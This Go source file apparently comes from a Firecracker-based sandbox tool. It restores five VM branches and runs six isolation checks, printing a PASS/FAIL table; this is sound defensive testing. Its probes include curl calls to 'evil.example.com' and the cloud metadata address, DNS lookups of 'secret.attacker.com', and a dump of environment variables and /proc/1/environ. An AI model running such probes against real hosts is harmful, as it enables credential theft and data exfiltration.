//go:build linux

package pool

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"text/tabwriter"
	"time"

	"github.com/Heman10x-NGU/branchvm/pkg/cgroup"
	"github.com/Heman10x-NGU/branchvm/pkg/netiso"
	"github.com/Heman10x-NGU/branchvm/pkg/storage"
	"github.com/Heman10x-NGU/branchvm/pkg/types"
)

const (
	verifyBranches  = 5
	verifyMemMB     = 1024
	probeTimeoutSec = 30
	exitNotFound    = 127
)

// Check is one attack and its measured outcome.
type Check struct {
	ID, Name string
	Pass     bool
	Evidence string
}

func (c Check) failed(err error) Check {
	c.Pass, c.Evidence = false, err.Error()
	return c
}

// VerifyOptions configures Verify.
type VerifyOptions struct {
	Repo string
	Out  io.Writer
}

type verifyBranch struct {
	b      *Branch
	err    error
	ent    types.EntropyResponse
	entErr error
}

// Verify restores 5 branches, fires the six attacks, tears the run down,
// prints the PASS/FAIL table, and reports whether all six passed.
func Verify(ctx context.Context, opt VerifyOptions) (bool, error) {
	if err := prepareHost(opt.Out); err != nil {
		return false, err
	}
	if err := requireGolden(); err != nil {
		return false, err
	}
	meta, _, err := loadGoldenMeta()
	if err != nil {
		return false, err
	}
	memMB := max(int64(verifyMemMB), meta.MemMB)
	bcfg := branchConfigFromMeta(meta)

	tgz, err := storage.PackWorkspace(opt.Repo)
	if err != nil {
		return false, fmt.Errorf("pack workspace %s: %w", opt.Repo, err)
	}
	body, ctype, err := storage.EncodeSyncMultipart(types.SyncMeta{Mode: "full"}, tgz)
	if err != nil {
		return false, err
	}
	goldenBefore, err := sha256File(goldenRootfs())
	if err != nil {
		return false, err
	}
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()
	cgroup.InstallCleanupTrap(cancel)
	rec := newRecorder(newRunID(), verifyBranches, opt.Out)
	fmt.Fprintf(opt.Out, "verify run %s: restoring %d branches\n", rec.runID(), verifyBranches)
	vbs := launchVerifyBranches(ctx, rec, memMB, bcfg, ctype, body)
	checks := []Check{
		checkEnvKey(ctx, vbs[0]),
		checkFirewall(ctx, vbs[0]),
		checkDNS(ctx, vbs[0]),
		checkCoW(ctx, vbs, goldenBefore, meta),
		checkEntropy(vbs),
	}
	checks = append(checks, checkTeardown(rec.snapshot(), vbs))
	return printChecks(opt.Out, checks), nil
}

// launchVerifyBranches samples /entropy right after each restore, before
// any exec, so guest activity cannot mask a missing VMGenID reseed.
func launchVerifyBranches(ctx context.Context, rec *recorder, memMB int64, bcfg BranchConfig, ctype string, body []byte) []verifyBranch {
	vbs := make([]verifyBranch, verifyBranches)
	var wg sync.WaitGroup
	for i := 1; i <= verifyBranches; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			vb := &vbs[i-1]
			vb.b, vb.err = LaunchBranchConfigured(ctx, rec.runID(), i, memMB, types.FileRestore, bcfg, rec.set)
			if vb.err != nil {
				rec.setStatus(i, StatusError)
				return
			}
			rec.set(vb.b.State(StatusRunning))
			vb.ent, vb.entErr = vb.b.Guest.entropy(ctx)
			if err := vb.b.SyncMultipart(ctx, ctype, body); err != nil {
				vb.err = fmt.Errorf("branch %d sync: %w", i, err)
			}
		}(i)
	}
	wg.Wait()
	return vbs
}

func (vb verifyBranch) exec(ctx context.Context, argv ...string) (types.ExecResponse, error) {
	if vb.b == nil || vb.err != nil {
		return types.ExecResponse{}, fmt.Errorf("branch unavailable: %w", vb.err)
	}
	return vb.b.Exec(ctx, argv, probeTimeoutSec)
}

func blocked(res types.ExecResponse) bool {
	return res.ExitCode != 0 && res.ExitCode != exitNotFound
}

func checkEnvKey(ctx context.Context, vb verifyBranch) Check {
	c := Check{ID: "P1", Name: "env-key"}
	want := DummyKey(1)
	res, err := vb.exec(ctx, "printenv", "ANTHROPIC_API_KEY")
	if err != nil {
		return c.failed(err)
	}
	dump, err := vb.exec(ctx, "sh", "-c", `env; tr '\0' '\n' < /proc/1/environ`)
	if err != nil {
		return c.failed(err)
	}
	got := strings.TrimSpace(res.Stdout)
	var checked, leaked []string
	for _, name := range []string{"ANTHROPIC_API_KEY", "OPENAI_API_KEY", "OPENROUTER_API_KEY"} {
		hostKey := os.Getenv(name)
		if hostKey == "" {
			continue
		}
		checked = append(checked, name)
		if strings.Contains(res.Stdout+dump.Stdout+dump.Stderr, hostKey) {
			leaked = append(leaked, name)
		}
	}
	c.Pass = got == want && dump.ExitCode == 0 && len(leaked) == 0
	keys := "host real keys unset, substring scan skipped"
	if len(checked) > 0 {
		keys = fmt.Sprintf("real %s found %d times", strings.Join(checked, "+"), len(leaked))
	}
	c.Evidence = fmt.Sprintf("printenv=%q want %q; env+/proc/1/environ (%d bytes, exit %d): %s",
		got, want, len(dump.Stdout), dump.ExitCode, keys)
	return c
}

func checkFirewall(ctx context.Context, vb verifyBranch) Check {
	c := Check{ID: "P2", Name: "firewall"}
	targets := []string{"http://93.184.216.34", "http://evil.example.com", "http://169.254.169.254/latest/meta-data/"}
	pass := true
	var parts []string
	for _, t := range targets {
		res, err := vb.exec(ctx, "curl", "--max-time", "4", "-s", "-o", "/dev/null", t)
		if err != nil {
			return c.failed(err)
		}
		pass = pass && blocked(res)
		u, _ := url.Parse(t)
		parts = append(parts, fmt.Sprintf("%s exit=%d", u.Host, res.ExitCode))
	}
	gw := fmt.Sprintf("http://%s:%d/anthropic/v1/models", netiso.HostIP(1), netiso.GatewayPort)
	ctl, err := vb.exec(ctx, "curl", "--max-time", "10", "-s", "-o", "/dev/null", "-w", "%{http_code}",
		"-H", "x-api-key: "+DummyKey(1), gw)
	if err != nil {
		return c.failed(err)
	}
	code := strings.TrimSpace(ctl.Stdout)
	ctlOK := ctl.ExitCode == 0 && code != "" && code != "000"
	c.Pass = pass && ctlOK
	c.Evidence = fmt.Sprintf("%s; control gateway exit=%d http=%s", strings.Join(parts, ", "), ctl.ExitCode, code)
	return c
}

func checkDNS(ctx context.Context, vb verifyBranch) Check {
	c := Check{ID: "P3", Name: "dns-exfil"}
	probes := []struct {
		label string
		argv  []string
	}{
		{"nslookup udp/53", []string{"nslookup", "-timeout=3", "-retry=1", "secret.attacker.com", "8.8.8.8"}},
		{"dig tcp/53", []string{"dig", "+tcp", "+time=3", "+tries=1", "@8.8.8.8", "secret.attacker.com"}},
	}
	pass := true
	var parts []string
	for _, p := range probes {
		res, err := vb.exec(ctx, p.argv...)
		if err != nil {
			return c.failed(err)
		}
		pass = pass && blocked(res)
		parts = append(parts, fmt.Sprintf("%s exit=%d", p.label, res.ExitCode))
	}
	c.Pass = pass
	c.Evidence = strings.Join(parts, ", ")
	return c
}

func checkCoW(ctx context.Context, vbs []verifyBranch, goldenBefore string, meta types.GoldenMeta) Check {
	c := Check{ID: "P4", Name: "cow-disk"}
	withDB := hasPostgres(meta.Services)
	dbName := meta.Database
	if dbName == "" {
		dbName = "postgres"
	}
	if err := writeDistinct(ctx, vbs, withDB, dbName); err != nil {
		return c.failed(err)
	}
	goldenAfter, err := sha256File(goldenRootfs())
	if err != nil {
		return c.failed(err)
	}
	clones := make([]string, len(vbs))
	errs := make([]error, len(vbs))
	var wg sync.WaitGroup
	for i, vb := range vbs {
		wg.Add(1)
		go func(i int, dir string) {
			defer wg.Done()
			clones[i], errs[i] = sha256File(filepath.Join(dir, RootfsName))
		}(i, vb.b.Dir)
	}
	wg.Wait()
	if err := errors.Join(errs...); err != nil {
		return c.failed(err)
	}
	unchanged, distinct := goldenBefore == goldenAfter, allDistinct(clones)
	c.Pass = unchanged && distinct
	short := make([]string, len(clones))
	for i, h := range clones {
		short[i] = h[:12]
	}
	dbNote := "each DB saw only its own row"
	if !withDB {
		dbNote = "stateless image (disk CoW verified without DB)"
	}
	c.Evidence = fmt.Sprintf("golden sha256 before=%s after=%s unchanged=%t; %d clone sha256 pairwise distinct=%t [%s]; %s",
		goldenBefore[:12], goldenAfter[:12], unchanged, len(clones), distinct, strings.Join(short, " "), dbNote)
	return c
}

func writeDistinct(ctx context.Context, vbs []verifyBranch, withDB bool, dbName string) error {
	errs := make([]error, len(vbs))
	var wg sync.WaitGroup
	for i, vb := range vbs {
		wg.Add(1)
		go func(i int, vb verifyBranch) {
			defer wg.Done()
			idx := i + 1
			var script string
			if withDB {
				script = fmt.Sprintf(`set -e
yes branchvm-p4-branch-%[1]d | dd of=/var/tmp/bvm-p4.bin bs=1M count=1 iflag=fullblock status=none
psql -h 127.0.0.1 -U postgres -d %[2]s -v ON_ERROR_STOP=1 -qc "CREATE TABLE IF NOT EXISTS bvm_scratch (branch int); INSERT INTO bvm_scratch VALUES (%[1]d);"
psql -h 127.0.0.1 -U postgres -d %[2]s -tAc "SELECT string_agg(branch::text, ',') FROM bvm_scratch"
sync`, idx, dbName)
			} else {
				script = fmt.Sprintf(`set -e
yes branchvm-p4-branch-%d | dd of=/var/tmp/bvm-p4.bin bs=1M count=1 iflag=fullblock status=none
sync`, idx)
			}
			res, err := vb.exec(ctx, "sh", "-c", script)
			switch {
			case err != nil:
				errs[i] = fmt.Errorf("branch %d write: %w", idx, err)
			case res.ExitCode != 0:
				errs[i] = fmt.Errorf("branch %d write: exit %d: %s", idx, res.ExitCode, strings.TrimSpace(res.Stderr))
			case withDB && lastLine(res.Stdout) != strconv.Itoa(idx):
				errs[i] = fmt.Errorf("branch %d DB rows %q, want only %d", idx, lastLine(res.Stdout), idx)
			}
		}(i, vb)
	}
	wg.Wait()
	return errors.Join(errs...)
}

func checkEntropy(vbs []verifyBranch) Check {
	c := Check{ID: "P5", Name: "vmgenid-entropy"}
	hexes := make([]string, 0, len(vbs))
	boots := map[string]bool{}
	for i, vb := range vbs {
		if vb.b == nil || vb.entErr != nil || len(vb.ent.Hex) != 64 {
			return c.failed(fmt.Errorf("branch %d: no 32-byte entropy sample (launch: %v, entropy: %v)", i+1, vb.err, vb.entErr))
		}
		hexes = append(hexes, vb.ent.Hex)
		boots[vb.ent.BootID] = true
	}
	short := make([]string, len(hexes))
	for i, h := range hexes {
		short[i] = h[:8]
	}
	bootNote := fmt.Sprintf("boot_id: %d distinct across %d clones (clones resume one kernel boot, so a shared boot_id is expected)", len(boots), len(hexes))
	if a, b, dup := firstDuplicate(hexes); dup {
		c.Evidence = fmt.Sprintf("IDENTICAL /dev/urandom output in branches %d and %d: VMGenID reseed did not happen [%s]; %s",
			a+1, b+1, strings.Join(short, " "), bootNote)
		return c
	}
	c.Pass = true
	c.Evidence = fmt.Sprintf("%d/%d distinct 32-byte /dev/urandom samples read right after restore [%s]; %s",
		len(hexes), len(hexes), strings.Join(short, " "), bootNote)
	return c
}

func checkTeardown(st types.RunState, vbs []verifyBranch) Check {
	c := Check{ID: "P6", Name: "zero-leak teardown"}
	live := make([]*Branch, 0, len(vbs))
	for _, vb := range vbs {
		live = append(live, vb.b)
	}
	terr := teardownRun(st, live)
	rep, err := ScanLeaks(gatewayAddrs(st))
	if err != nil {
		return c.failed(err)
	}
	_, statErr := os.Stat(filepath.Join(RunsDir, st.RunID+".json"))
	stateGone := errors.Is(statErr, os.ErrNotExist)
	c.Pass = terr == nil && rep.Clean() && stateGone
	c.Evidence = fmt.Sprintf("%s state_file_removed=%t", rep.Summary(), stateGone)
	if terr != nil {
		c.Evidence += "; teardown error: " + terr.Error()
	}
	return c
}

func printChecks(out io.Writer, checks []Check) bool {
	tw := tabwriter.NewWriter(out, 0, 0, 2, ' ', 0)
	fmt.Fprintln(tw, "ID\tATTACK\tRESULT\tEVIDENCE")
	passed := 0
	for _, c := range checks {
		result := "FAIL"
		if c.Pass {
			result = "PASS"
			passed++
		}
		fmt.Fprintf(tw, "%s\t%s\t%s\t%s\n", c.ID, c.Name, result, c.Evidence)
	}
	tw.Flush()
	fmt.Fprintf(out, "\n%d/%d PASS\n", passed, len(checks))
	return passed == len(checks)
}

func sha256File(path string) (string, error) {
	f, err := os.Open(path)
	if err != nil {
		return "", fmt.Errorf("sha256 %s: %w", path, err)
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", fmt.Errorf("sha256 %s: %w", path, err)
	}
	return hex.EncodeToString(h.Sum(nil)), nil
}

func allDistinct(xs []string) bool {
	_, _, dup := firstDuplicate(xs)
	return !dup
}

func firstDuplicate(xs []string) (int, int, bool) {
	seen := map[string]int{}
	for i, x := range xs {
		if j, ok := seen[x]; ok {
			return j, i, true
		}
		seen[x] = i
	}
	return 0, 0, false
}

// LeakReport lists every branchvm resource still present on the host.
type LeakReport struct {
	NetNS, Links, Cgroups, CloneDirs, Firecrackers, Gateways []string
}

// Clean reports whether nothing leaked.
func (r LeakReport) Clean() bool {
	return len(r.NetNS)+len(r.Links)+len(r.Cgroups)+len(r.CloneDirs)+len(r.Firecrackers)+len(r.Gateways) == 0
}

// Summary is a one-line count with the names of anything that leaked.
func (r LeakReport) Summary() string {
	parts := []string{}
	for _, f := range []struct {
		name  string
		items []string
	}{{"netns", r.NetNS}, {"veth", r.Links}, {"cgroups", r.Cgroups}, {"clone_dirs", r.CloneDirs},
		{"firecracker", r.Firecrackers}, {"gateways", r.Gateways}} {
		s := fmt.Sprintf("%s=%d", f.name, len(f.items))
		if len(f.items) > 0 {
			s += " [" + strings.Join(f.items, ",") + "]"
		}
		parts = append(parts, s)
	}
	return strings.Join(parts, " ")
}

// ScanLeaks checks the host for bvm netns, bvm veths, branch cgroups,
// clone dirs, live firecracker processes, and listening gateways.
func ScanLeaks(gatewayAddrs []string) (LeakReport, error) {
	var r LeakReport
	ns, err := exec.Command("ip", "netns", "list").Output()
	if err != nil {
		return r, fmt.Errorf("ip netns list: %w", err)
	}
	for _, line := range strings.Split(string(ns), "\n") {
		if f := strings.Fields(line); len(f) > 0 && strings.HasPrefix(f[0], "bvm-") {
			r.NetNS = append(r.NetNS, f[0])
		}
	}
	links, err := exec.Command("ip", "-o", "link", "show").Output()
	if err != nil {
		return r, fmt.Errorf("ip link show: %w", err)
	}
	for _, line := range strings.Split(string(links), "\n") {
		if f := strings.Fields(line); len(f) > 1 {
			name, _, _ := strings.Cut(strings.TrimSuffix(f[1], ":"), "@")
			if strings.HasPrefix(name, "bvmh-") || strings.HasPrefix(name, "bvmg-") {
				r.Links = append(r.Links, name)
			}
		}
	}
	if r.Cgroups, err = listDirs(cgroup.Root); err != nil {
		return r, err
	}
	if r.CloneDirs, err = listDirs(ClonesDir); err != nil {
		return r, err
	}
	r.Firecrackers = firecrackerPIDs()
	for _, a := range gatewayAddrs {
		if c, err := net.DialTimeout("tcp", a, 300*time.Millisecond); err == nil {
			c.Close()
			r.Gateways = append(r.Gateways, a)
		}
	}
	return r, nil
}

func listDirs(dir string) ([]string, error) {
	entries, err := os.ReadDir(dir)
	if errors.Is(err, os.ErrNotExist) {
		return nil, nil
	}
	if err != nil {
		return nil, fmt.Errorf("read %s: %w", dir, err)
	}
	var out []string
	for _, e := range entries {
		if e.IsDir() {
			out = append(out, e.Name())
		}
	}
	return out, nil
}

func firecrackerPIDs() []string {
	entries, _ := os.ReadDir("/proc")
	var out []string
	for _, e := range entries {
		if pid, err := strconv.Atoi(e.Name()); err == nil && isFirecracker(pid) {
			out = append(out, e.Name())
		}
	}
	sort.Strings(out)
	return out
}

func reportLeaks(out io.Writer, addrs []string) error {
	rep, err := ScanLeaks(addrs)
	if err != nil {
		return fmt.Errorf("leak scan: %w", err)
	}
	fmt.Fprintf(out, "leak scan: %s\n", rep.Summary())
	if !rep.Clean() {
		return errors.New("leak scan found leftover resources")
	}
	return nil
}
